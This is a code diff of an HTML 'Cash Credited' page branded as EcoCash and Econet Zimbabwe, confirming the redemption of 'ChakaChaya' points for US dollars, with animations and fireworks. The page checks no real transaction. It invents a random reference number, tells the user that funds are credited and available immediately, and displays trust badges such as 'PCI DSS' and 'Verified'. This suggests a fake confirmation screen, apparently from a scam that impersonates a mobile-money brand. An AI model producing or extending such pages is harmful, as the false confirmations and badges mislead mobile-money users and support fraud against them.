@@ -3,98 +3,112 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
-<meta name="theme-color" content="#ffffff"/>
+<meta name="theme-color" content="#F8FAFC"/>
 <title>Cash Credited · ChakaChaya</title>
 <link rel="icon" href="assets/ecocash.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 :root{
-  --navy:#1a3a8f;--blue:#1a3a8f;--blue-light:#dce8ff;
-  --green:#16a34a;--green-light:#f0fdf4;
-  --page:#e8eaf0;--white:#ffffff;
-  --border:#d8dce8;--border-mid:#cbd5e1;
-  --ink:#0f172a;--soft:#64748b;--faint:#94a3b8;
-  --font:'Inter',sans-serif;
-  --r:12px;--r-lg:16px;
-  --sh:0 1px 2px rgba(0,0,0,.05),0 2px 8px rgba(0,0,0,.04);
+  --c-primary:#1A3A8F;--c-primary-container:#E8EFFF;
+  --c-red:#D0021B;--c-green:#16A34A;--c-green-container:#DCFCE7;
+  --c-gold:#D97706;--c-gold-container:#FEF3C7;
+  --c-bg:#F8FAFC;--c-surface:#FFFFFF;--c-surface-variant:#F1F5F9;
+  --c-outline:#E2E8F0;--c-outline-variant:#F1F5F9;
+  --c-on-surface:#0F172A;--c-on-surface-variant:#475569;--c-placeholder:#94A3B8;
+  --el-1:0 1px 2px rgba(15,23,42,.06),0 2px 8px rgba(15,23,42,.04);
+  --el-2:0 2px 4px rgba(15,23,42,.06),0 4px 16px rgba(15,23,42,.06);
+  --el-3:0 4px 8px rgba(15,23,42,.08),0 8px 24px rgba(15,23,42,.08);
+  --r-sm:10px;--r-md:16px;--r-lg:20px;--r-xl:24px;--r-full:999px;
+  --f:Inter,sans-serif;
+  --ease-spring:cubic-bezier(.34,1.56,.64,1);--ease-out:cubic-bezier(.22,1,.36,1);
 }
-@keyframes pageEnter{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
-html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font);background:#e8eaf0;color:var(--ink)}
-.screen{display:flex;flex-direction:column;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative;animation:pageEnter .32s ease both}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--c-bg);-webkit-font-smoothing:antialiased}
 
-/* REVEAL CURTAIN */
-.nav-curtain{position:fixed;inset:0;background:var(--white);opacity:1;pointer-events:none;z-index:9999;transition:opacity .4s ease}
+@keyframes fade-up{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+@keyframes scale-in{from{transform:scale(.88);opacity:0}to{transform:none;opacity:1}}
+@keyframes card-in{from{transform:translateY(16px);opacity:0}to{transform:none;opacity:1}}
+@keyframes check-appear{0%{transform:scale(0) rotate(-30deg);opacity:0}60%{transform:scale(1.15) rotate(3deg)}100%{transform:scale(1) rotate(0);opacity:1}}
+@keyframes amount-count{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes particle{0%{transform:translate(0,0) rotate(0deg);opacity:1}100%{transform:translate(var(--tx),var(--ty)) rotate(var(--tr));opacity:0}}
+@keyframes reveal{from{opacity:0}to{opacity:1}}
+@keyframes cf-fall{0%{transform:translateY(0) rotate(0deg);opacity:1}100%{transform:translateY(105vh) rotate(540deg);opacity:0}}
+
+.screen{display:flex;flex-direction:column;width:100%;height:100dvh;overflow:hidden;position:relative}
+
+/* ── CURTAIN ── */
+.nav-curtain{position:fixed;inset:0;background:var(--c-surface);opacity:1;pointer-events:none;z-index:9999;transition:opacity .4s var(--ease-out)}
 .nav-curtain.clear{opacity:0}
+.fw-canvas{position:fixed;inset:0;pointer-events:none;z-index:1;width:100%;height:100%}
 
-/* CANVAS */
-.fw-canvas{position:fixed;inset:0;pointer-events:none!important;z-index:1;width:100%;height:100%;display:block}
+/* ── APP BAR ── */
+.app-bar{flex-shrink:0;background:var(--c-surface);border-bottom:1px solid var(--c-outline);padding:max(14px,env(safe-area-inset-top)) 20px 14px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:10}
+.app-wordmark{font-size:22px;font-weight:800;letter-spacing:-.35px}
+.app-wordmark .eco{color:var(--c-primary)}.app-wordmark .cash{color:#D0021B}
+.credited-chip{background:var(--c-green-container);border-radius:var(--r-full);padding:5px 12px;font-size:12px;font-weight:700;color:var(--c-green);display:flex;align-items:center;gap:5px}
+.credited-chip svg{stroke:var(--c-green);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;width:13px;height:13px}
 
-/* HEADER */
-.header{background:var(--white);padding:max(12px,env(safe-area-inset-top)) 16px 16px;flex-shrink:0;border-bottom:1px solid var(--border)}
-.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
-.brand{display:flex;align-items:center;gap:7px}
-.brand img{height:22px;object-fit:contain}
-.brand-sep{width:1px;height:15px;background:var(--border)}
-.status-chip{background:var(--green-light);border:1px solid #bbf7d0;border-radius:999px;padding:4px 11px;font-size:11px;font-weight:700;color:var(--green)}
+/* ── BODY ── */
+.body{flex:1;overflow-y:auto;overflow-x:hidden;overscroll-behavior:contain;min-height:0;scrollbar-width:none;padding:0 16px max(24px,env(safe-area-inset-bottom));position:relative;z-index:5}
+.body::-webkit-scrollbar{display:none}
 
-/* AMOUNT DISPLAY */
-.amount-block{display:flex;align-items:center;gap:12px}
-.success-icon-wrap{width:40px;height:40px;border-radius:50%;background:var(--green-light);border:1px solid #bbf7d0;display:flex;align-items:center;justify-content:center;flex-shrink:0;animation:iconPop .45s .1s cubic-bezier(.34,1.56,.64,1) both}
-@keyframes iconPop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
-.success-icon-wrap svg{stroke:var(--green);width:18px;height:18px;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
-.amount-row{display:flex;align-items:baseline;gap:4px}
-.amount-cur{font-size:14px;font-weight:600;color:var(--soft);margin-bottom:2px}
-.amount-val{font-size:38px;font-weight:800;color:#0a1830;line-height:1;letter-spacing:-.04em}
-.amount-sub{font-size:12px;color:var(--soft);margin-top:3px}
+/* ── SUCCESS HERO ── */
+.success-hero{padding:28px 20px 24px;text-align:center;animation:fade-up .4s var(--ease-out) both}
+.check-wrap{width:80px;height:80px;border-radius:50%;background:var(--c-green-container);margin:0 auto 18px;display:flex;align-items:center;justify-content:center;animation:check-appear .5s .1s var(--ease-spring) both;position:relative}
+.check-wrap::after{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid #BBF7D0;animation:reveal .3s .5s ease both}
+.check-wrap svg{stroke:var(--c-green);fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;width:36px;height:36px}
+.hero-eyebrow{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--c-green);margin-bottom:6px}
+.hero-amount-row{display:flex;align-items:baseline;justify-content:center;gap:6px;margin-bottom:6px;animation:amount-count .5s .2s var(--ease-out) both}
+.hero-cur{font-size:20px;font-weight:700;color:var(--c-on-surface-variant)}
+.hero-amount{font-size:52px;font-weight:800;color:var(--c-on-surface);line-height:1;letter-spacing:-.05em}
+.hero-sub{font-size:14px;color:var(--c-on-surface-variant);line-height:1.55}
+.hero-sub strong{color:var(--c-on-surface);font-weight:600}
 
-/* BODY */
-.body{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;padding:16px 14px max(70px,calc(58px + env(safe-area-inset-bottom)));overscroll-behavior:contain;min-height:0;position:relative;z-index:5;scrollbar-width:thin;scrollbar-color:var(--border) transparent}
-.body::-webkit-scrollbar{width:3px}
-.body::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+/* ── CARDS ── */
+.section-card{background:var(--c-surface);border-radius:var(--r-lg);box-shadow:var(--el-1);overflow:hidden;margin-bottom:12px}
+.card-hd{padding:14px 18px;border-bottom:1px solid var(--c-outline-variant);display:flex;align-items:center;justify-content:space-between}
+.card-title{font-size:14px;font-weight:700;color:var(--c-on-surface)}
+.card-badge{font-size:10px;font-weight:600;padding:3px 9px;border-radius:var(--r-full)}
 
-/* CARDS */
-.card{background:var(--white);border:1px solid var(--border);border-radius:var(--r-lg);overflow:hidden;margin-bottom:12px;box-shadow:var(--sh)}
-@keyframes cardIn{from{transform:translateY(10px);opacity:0}to{transform:none;opacity:1}}
+/* Points↔Cash highlight */
+.amounts-row{display:flex;gap:10px;padding:14px}
+.amt-block{flex:1;border-radius:var(--r-md);padding:14px;text-align:center}
+.amt-pts{background:var(--c-surface-variant)}
+.amt-cash{background:var(--c-green-container)}
+.amt-val{font-size:22px;font-weight:800;line-height:1;letter-spacing:-.02em}
+.amt-pts .amt-val{color:var(--c-primary)}
+.amt-cash .amt-val{color:var(--c-green)}
+.amt-lbl{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:5px}
+.amt-pts .amt-lbl{color:var(--c-placeholder)}
+.amt-cash .amt-lbl{color:#4ADE80}
 
-/* AMOUNTS ROW */
-.amounts-row{display:flex;gap:8px;padding:14px}
-.amt-block{flex:1;border-radius:var(--r);padding:12px;text-align:center}
-.amt-pts{background:var(--page);border:1px solid var(--border)}
-.amt-cash{background:var(--green-light);border:1px solid #bbf7d0}
-.amt-val{font-size:20px;font-weight:800;line-height:1;letter-spacing:-.02em}
-.amt-pts .amt-val{color:var(--navy)}
-.amt-cash .amt-val{color:var(--green)}
-.amt-lbl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
-.amt-pts .amt-lbl{color:var(--faint)}
-.amt-cash .amt-lbl{color:#86efac}
+/* Detail rows */
+.det-row{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-top:1px solid var(--c-outline-variant)}
+.det-row:first-of-type{border-top:none}
+.det-key{font-size:13px;color:var(--c-on-surface-variant);display:flex;align-items:center;gap:10px}
+.det-icon{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.det-icon svg{width:14px;height:14px;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.det-val{font-size:13px;font-weight:700;color:var(--c-on-surface)}
+.det-val.green{color:var(--c-green)}
+.ref-badge{font-size:12px;font-weight:700;color:var(--c-on-surface-variant);background:var(--c-surface-variant);border:1px solid var(--c-outline);padding:3px 10px;border-radius:var(--r-full)}
 
-/* DETAIL ROWS */
-.card-hd{padding:12px 15px;border-bottom:1px solid var(--border);font-size:13px;font-weight:700;color:var(--ink)}
-.det-row{display:flex;align-items:center;justify-content:space-between;padding:11px 15px;border-bottom:1px solid var(--border)}
-.det-row:last-child{}
-.det-key{font-size:12px;color:var(--soft);font-weight:500;display:flex;align-items:center;gap:8px}
-.det-icon{width:22px;height:22px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.det-val{font-size:13px;font-weight:700;color:var(--ink)}
-.det-val.green{color:var(--green);font-weight:800}
+/* Notice */
+.notice{background:var(--c-green-container);border-radius:var(--r-lg);padding:14px 16px;margin-bottom:12px;font-size:13px;line-height:1.7;color:var(--c-on-surface-variant)}
+.notice strong{color:var(--c-on-surface);font-weight:700}
 
-/* NOTICE */
-.notice{background:var(--green-light);border:1px solid #bbf7d0;border-radius:var(--r-lg);padding:13px 14px;margin-bottom:12px;font-size:12px;line-height:1.7;color:var(--soft);font-weight:500;animation:cardIn .4s .18s ease both}
-.notice strong{color:var(--ink);font-weight:700}
+/* Security */
+.sec-card{background:var(--c-surface);border-radius:var(--r-lg);box-shadow:var(--el-1);margin-bottom:12px}
+.sec-row{display:flex;align-items:center;justify-content:center;padding:12px 0}
+.sec-badge{display:flex;align-items:center;gap:4px;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;color:var(--c-green);padding:0 12px}
+.sec-badge+.sec-badge{border-left:1px solid var(--c-outline-variant)}
+.sec-badge svg{stroke:var(--c-green);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;width:10px;height:10px}
+.powered{text-align:center;padding:8px 0;font-size:10px;color:var(--c-placeholder);font-weight:500;letter-spacing:.3px;border-top:1px solid var(--c-outline-variant)}
 
-/* SECURITY */
-.sec-card{background:var(--white);border:1px solid var(--border);border-radius:var(--r-lg);padding:12px 0;box-shadow:var(--sh);animation:cardIn .4s .24s ease both}
-.sec-row{display:flex;align-items:center;justify-content:center}
-.sec-badge{display:flex;align-items:center;gap:4px;font-size:9px;font-weight:700;color:var(--green);letter-spacing:.4px;text-transform:uppercase;padding:0 12px}
-.sec-badge+.sec-badge{border-left:1px solid var(--border)}
-.sec-badge svg{stroke:var(--green);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;opacity:.8}
-.powered{text-align:center;padding:8px 0 2px;font-size:9px;color:var(--faint);font-weight:500;letter-spacing:.4px;text-transform:uppercase}
+/* CONFETTI */
+.cf{position:fixed;pointer-events:none;z-index:9900;animation:cf-fall linear forwards}
 
-.bot-nav{position:fixed;bottom:0;left:0;right:0;background:#ffffff;border-top:1px solid #d8dce8;display:flex;align-items:stretch;height:max(56px,calc(50px + env(safe-area-inset-bottom)));z-index:100}
-.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;cursor:pointer;padding-bottom:env(safe-area-inset-bottom);border:none;background:none}
-.nav-item svg{stroke:#9aa5bb;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;width:22px;height:22px}
-.nav-item span{font-size:10px;font-weight:500;color:#9aa5bb}
+
 </style>
 </head>
 <body>
@@ -102,39 +116,33 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
 <div class="nav-curtain" id="navCurtain"></div>
 
 <div class="screen">
-  <div class="header">
-    <div class="header-top">
-      <div style="font-size:20px;font-weight:800;letter-spacing:-.3px"><span style="color:#1a3a8f">Eco</span><span style="color:#d0021b">Cash</span></div>
-      <div class="status-chip">Credited ✓</div>
+  <header class="app-bar">
+    <div class="app-wordmark"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="credited-chip">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      Credited
     </div>
-    <div class="amount-block">
-      <div class="success-icon-wrap"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
-      <div>
-        <div class="amount-row"><span class="amount-cur">USD</span><span class="amount-val" id="headerAmount">0.00</span></div>
-        <div class="amount-sub">Cash Credited to EcoCash Wallet</div>
+  </header>
+  <main class="body" id="bodyEl">
+    <div class="success-hero">
+      <div class="check-wrap" aria-hidden="true">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
+      <div class="hero-eyebrow">Cash Credited</div>
+      <div class="hero-amount-row">
+        <span class="hero-cur">USD</span>
+        <span class="hero-amount" id="heroAmount">0.00</span>
+      </div>
+      <p class="hero-sub">Successfully credited to your <strong>EcoCash wallet</strong>.<br>Funds are available immediately.</p>
     </div>
-  </div>
-
-  <div class="body">
-    <!-- Filled by JS -->
-  </div>
-  <div class="bot-nav">
-    <button class="nav-item active" style="color:#1a3a8f">
-      <svg viewBox="0 0 24 24" style="stroke:#1a3a8f"><rect x="1" y="4" width="22" height="16" rx="2" fill="#1a3a8f"/><line x1="1" y1="10" x2="23" y2="10" stroke="#fff"/></svg>
-      <span style="color:#1a3a8f;font-weight:700">Pay</span>
-    </button>
-    <button class="nav-item"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><span>Chat</span></button>
-    <button class="nav-item"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg><span>Explore</span></button>
-    <button class="nav-item"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg><span>Search</span></button>
-  </div>
-
+  </main>
 </div>
 
 <script>
-function haptic(s){if(!navigator.vibrate)return;var p={success:[12,60,12],medium:22};try{navigator.vibrate(p[s]||12)}catch(e){}}
+function haptic(s){if(!navigator.vibrate)return;try{navigator.vibrate({success:[12,60,12],medium:22}[s]||12)}catch(e){}}
 
 (function main(){
+  /* Curtain reveal */
   const curtain=document.getElementById('navCurtain');
   requestAnimationFrame(()=>setTimeout(()=>curtain.classList.add('clear'),40));
 
@@ -144,79 +152,72 @@ function haptic(s){if(!navigator.vibrate)return;var p={success:[12,60,12],medium
   let rd={};try{rd=JSON.parse(sessionStorage.getItem('redeemData')||'{}')}catch(e){}
   const points=rd.points||0,usd=rd.usd||'0.00',usdFmt=rd.usdFormatted||('USD '+usd);
   const rate=rd.rate||'100 pts = USD 5.00';
-  const ts=rd.timestamp?new Date(rd.timestamp).toLocaleString():new Date().toLocaleString();
+  const ts=rd.timestamp?new Date(rd.timestamp).toLocaleString('en-ZW',{dateStyle:'medium',timeStyle:'short'}):new Date().toLocaleString();
   const refNo='CKC-'+Math.random().toString(36).slice(2,5).toUpperCase()+'-'+Date.now().toString(36).slice(-4).toUpperCase();
 
-  const amtEl=document.getElementById('headerAmount');
+  /* Hero amount count-up */
+  const amtEl=document.getElementById('heroAmount');
   const target=parseFloat(usd)||0;
-  if(target>0){const start=performance.now();function tick(ts2){const p=Math.min((ts2-start)/700,1),ease=1-Math.pow(1-p,3);amtEl.textContent=(target*ease).toFixed(2);if(p<1)requestAnimationFrame(tick);else amtEl.textContent=target.toFixed(2)}requestAnimationFrame(tick)}
-  else amtEl.textContent=parseFloat(usd).toFixed(2);
+  if(target>0){
+    const start=performance.now();
+    function tick(t){const p=Math.min((t-start)/700,1),ease=1-Math.pow(1-p,3);amtEl.textContent=(target*ease).toFixed(2);if(p<1)requestAnimationFrame(tick);else amtEl.textContent=target.toFixed(2)}
+    requestAnimationFrame(tick);
+  }else amtEl.textContent=parseFloat(usd).toFixed(2);
 
-  const body=document.querySelector('.body');
+  const body=document.getElementById('bodyEl');
+  let delay=0;
+  function addCard(html,d){setTimeout(()=>{const div=document.createElement('div');div.innerHTML=html;const el=div.firstElementChild;el.style.cssText=`animation:card-in .38s ${d*60}ms cubic-bezier(.22,1,.36,1) both`;body.appendChild(el)},d*60)}
 
-  // Redemption card
-  const redeemCard=document.createElement('div');
-  redeemCard.className='card';
-  redeemCard.style.animation='cardIn .4s .06s ease both';
-  redeemCard.innerHTML=`
-    <div class="card-hd" style="display:flex;align-items:center;justify-content:space-between">
-      <span>ChakaChaya Redeemed</span>
-      <span style="font-size:10px;font-weight:600;background:#f0fdf4;border:1px solid #bbf7d0;color:#16a34a;padding:2px 8px;border-radius:999px">Credited ✓</span>
+  /* Redemption summary card */
+  addCard(`<div class="section-card">
+    <div class="card-hd">
+      <span class="card-title">ChakaChaya Redeemed</span>
+      <span class="card-badge" style="background:#DCFCE7;color:#16A34A">Credited ✓</span>
     </div>
     <div class="amounts-row">
       <div class="amt-block amt-pts"><div class="amt-val">${Number(points).toLocaleString()}</div><div class="amt-lbl">Points</div></div>
-      <div class="amt-block amt-cash"><div class="amt-val">${usdFmt}</div><div class="amt-lbl">Cash Received</div></div>
-    </div>`;
-  body.appendChild(redeemCard);
-
-  function mkIcon(colour,svgPath){return `<div class="det-icon" style="background:${colour}18">${svgPath}</div>`}
-  const svgClock=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#d97706" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>`;
-  const svgRate=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#1a56db" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="5" x2="5" y2="19"/><circle cx="6.5" cy="6.5" r="2.5"/><circle cx="17.5" cy="17.5" r="2.5"/></svg>`;
-  const svgTick=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`;
-  const svgRef=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>`;
-
-  const detailCard=document.createElement('div');
-  detailCard.className='card';detailCard.style.animation='cardIn .4s .12s ease both';
-  detailCard.innerHTML=`
-    <div class="card-hd">Redemption Details</div>
-    <div class="det-row"><div class="det-key">${mkIcon('#1a56db',svgRate)} Conversion Rate</div><div class="det-val">${rate}</div></div>
-    <div class="det-row"><div class="det-key">${mkIcon('#16a34a',svgTick)} Cash Credited</div><div class="det-val green">${usdFmt}</div></div>
-    <div class="det-row"><div class="det-key">${mkIcon('#d97706',svgClock)} Date &amp; Time</div><div class="det-val">${ts}</div></div>
-    <div class="det-row"><div class="det-key">${mkIcon('#6366f1',svgRef)} Reference</div><div class="det-val">${refNo}</div></div>`;
-  body.appendChild(detailCard);
-
-  const notice=document.createElement('div');
-  notice.className='notice';
-  notice.innerHTML=`<strong>Congratulations!</strong> Your ChakaChaya points have been successfully redeemed. <strong>${usdFmt}</strong> has been credited to your EcoCash wallet and is available immediately. Thank you for participating in the EcoCash Rewards Programme.`;
-  body.appendChild(notice);
-
-  const secCard=document.createElement('div');
-  secCard.className='sec-card';
-  secCard.innerHTML=`
-    <div class="sec-row">
-      <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit SSL</div>
-      <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS</div>
-      <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Verified</div>
+      <div class="amt-block amt-cash"><div class="amt-val">${usdFmt}</div><div class="amt-lbl">Cash</div></div>
     </div>
-    <div class="powered">Powered by Econet EcoCash Zimbabwe</div>`;
-  body.appendChild(secCard);
+  </div>`,1);
+
+  /* Detail card */
+  const mkI=(bg,sc,path)=>`<div class="det-icon" style="background:${bg}"><svg viewBox="0 0 24 24" stroke="${sc}">${path}</svg></div>`;
+  addCard(`<div class="section-card">
+    <div class="card-hd"><span class="card-title">Redemption details</span></div>
+    <div class="det-row"><div class="det-key">${mkI('#E8EFFF','#1A3A8F','<line x1="19" y1="5" x2="5" y2="19"/><circle cx="6.5" cy="6.5" r="2.5"/><circle cx="17.5" cy="17.5" r="2.5"/>')} Conversion rate</div><div class="det-val">${rate}</div></div>
+    <div class="det-row"><div class="det-key">${mkI('#DCFCE7','#16A34A','<polyline points="20 6 9 17 4 12"/>')} Cash credited</div><div class="det-val green">${usdFmt}</div></div>
+    <div class="det-row"><div class="det-key">${mkI('#FEF3C7','#D97706','<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>')} Date &amp; time</div><div class="det-val" style="font-size:12px">${ts}</div></div>
+    <div class="det-row"><div class="det-key">${mkI('#F1F5F9','#475569','<path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/>')} Reference</div><div class="ref-badge">${refNo}</div></div>
+  </div>`,2);
+
+  /* Notice */
+  addCard(`<div class="notice"><strong>Congratulations!</strong> Your ChakaChaya points have been redeemed. <strong>${usdFmt}</strong> has been credited to your EcoCash wallet and is available immediately. Thank you for participating in the EcoCash Rewards Programme.</div>`,3);
+
+  /* Security */
+  addCard(`<div class="sec-card">
+    <div class="sec-row">
+      <div class="sec-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit SSL</div>
+      <div class="sec-badge"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS</div>
+      <div class="sec-badge"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Verified</div>
+    </div>
+    <div class="powered">Powered by Econet EcoCash Zimbabwe · ChakaChaya Rewards</div>
+  </div>`,4);
 
   haptic('success');
 
-  // Fireworks
+  /* Fireworks */
   const canvas=document.getElementById('fwCanvas');
   const ctx=canvas.getContext('2d');
-  const COLS=['#fff','#fbbf24','#34d399','#60a5fa','#f472b6','#a78bfa','#4ade80'];
+  const COLS=['#fff','#FDE68A','#34D399','#60A5FA','#F472B6','#A78BFA','#4ADE80','#FBBF24'];
   function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight}
   resize();window.addEventListener('resize',resize,{passive:true});
-  class Shell{constructor(){this.x=canvas.width*(0.1+Math.random()*.8);this.y=canvas.height;this.vy=-(12+Math.random()*9);this.vx=(Math.random()-.5)*2;this.peakY=canvas.height*(0.06+Math.random()*.38);this.exploded=false;this.dead=false;this.color=COLS[Math.floor(Math.random()*COLS.length)]}update(){if(this.exploded)return;this.vy+=0.35;this.x+=this.vx;this.y+=this.vy;if(this.vy>=0||this.y<=this.peakY){this.exploded=true;this.dead=true;burst(this)}}draw(){if(this.exploded)return;ctx.save();ctx.fillStyle=this.color;ctx.globalAlpha=.9;ctx.beginPath();ctx.arc(this.x,this.y,2.5,0,Math.PI*2);ctx.fill();ctx.restore()}}
-  class Particle{constructor(x,y,col){const a=Math.random()*Math.PI*2,sp=1.5+Math.random()*7;this.x=x;this.y=y;this.vx=Math.cos(a)*sp;this.vy=Math.sin(a)*sp;this.alpha=1;this.decay=.01+Math.random()*.014;this.gravity=.09;this.color=col;this.size=1.5+Math.random()*2}update(){this.vx*=.985;this.vy=this.vy*.985+this.gravity;this.x+=this.vx;this.y+=this.vy;this.alpha-=this.decay}draw(){if(this.alpha<=0)return;ctx.save();ctx.globalAlpha=this.alpha;ctx.fillStyle=this.color;ctx.shadowBlur=6;ctx.shadowColor=this.color;ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fill();ctx.restore()}get dead(){return this.alpha<=0}}
+  class Shell{constructor(){this.x=canvas.width*(.1+Math.random()*.8);this.y=canvas.height;this.vy=-(12+Math.random()*9);this.vx=(Math.random()-.5)*2;this.peakY=canvas.height*(.06+Math.random()*.38);this.exploded=false;this.dead=false;this.color=COLS[~~(Math.random()*COLS.length)]}update(){if(this.exploded)return;this.vy+=.35;this.x+=this.vx;this.y+=this.vy;if(this.vy>=0||this.y<=this.peakY){this.exploded=true;this.dead=true;burst(this)}}draw(){if(this.exploded)return;ctx.save();ctx.fillStyle=this.color;ctx.globalAlpha=.9;ctx.beginPath();ctx.arc(this.x,this.y,2.5,0,Math.PI*2);ctx.fill();ctx.restore()}}
+  class Particle{constructor(x,y,col){const a=Math.random()*Math.PI*2,sp=1.5+Math.random()*7;this.x=x;this.y=y;this.vx=Math.cos(a)*sp;this.vy=Math.sin(a)*sp;this.alpha=1;this.decay=.01+Math.random()*.014;this.gravity=.09;this.color=col;this.size=1.5+Math.random()*2}update(){this.vx*=.985;this.vy=this.vy*.985+this.gravity;this.x+=this.vx;this.y+=this.vy;this.alpha-=this.decay}draw(){if(this.alpha<=0)return;ctx.save();ctx.globalAlpha=this.alpha;ctx.fillStyle=this.color;ctx.shadowBlur=5;ctx.shadowColor=this.color;ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fill();ctx.restore()}get dead(){return this.alpha<=0}}
   const shells=[],particles=[];
-  function burst(s){const cnt=50+Math.floor(Math.random()*40),c2=COLS[Math.floor(Math.random()*COLS.length)];for(let i=0;i<cnt;i++)particles.push(new Particle(s.x,s.y,i%3===0?c2:s.color));haptic('medium')}
+  function burst(s){const n=48+~~(Math.random()*36),c2=COLS[~~(Math.random()*COLS.length)];for(let i=0;i<n;i++)particles.push(new Particle(s.x,s.y,i%3===0?c2:s.color));haptic('medium')}
   function loop(){ctx.clearRect(0,0,canvas.width,canvas.height);shells.forEach(s=>{s.update();s.draw()});for(let i=particles.length-1;i>=0;i--){particles[i].update();particles[i].draw();if(particles[i].dead)particles.splice(i,1)}if(shells.some(s=>!s.dead)||particles.length>0)requestAnimationFrame(loop);else{ctx.clearRect(0,0,canvas.width,canvas.height);canvas.style.display='none'}}
-  const delays=[200,620,980,1380,1740,2200,2680];
-  delays.forEach(d=>setTimeout(()=>{shells.push(new Shell())},d));
-  setTimeout(loop,160);setTimeout(()=>{if(canvas.parentNode)canvas.style.display='none'},8000);
+  [200,620,980,1380,1740,2200,2680].forEach(d=>setTimeout(()=>{shells.push(new Shell())},d));
+  setTimeout(loop,160);setTimeout(()=>{canvas.style.display='none'},9000);
 })();
 </script>
 </body>
